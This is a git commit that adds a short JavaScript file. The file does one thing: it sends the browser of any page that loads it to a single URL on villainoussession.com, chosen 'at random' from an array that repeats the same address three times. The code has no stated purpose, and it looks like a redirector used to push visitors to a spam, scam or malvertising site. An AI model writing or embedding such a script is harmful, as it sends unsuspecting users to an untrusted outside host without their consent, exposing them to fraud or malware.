97a646ee337ea24c1a4e41ab795fe00672340c1a
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-04-24 15:09:59 +0700

    Create akehilltoppd.js

---
+++ akehilltoppd.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+'https://villainoussession.com/pCZkVj',
+'https://villainoussession.com/pCZkVj',
+'https://villainoussession.com/pCZkVj'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
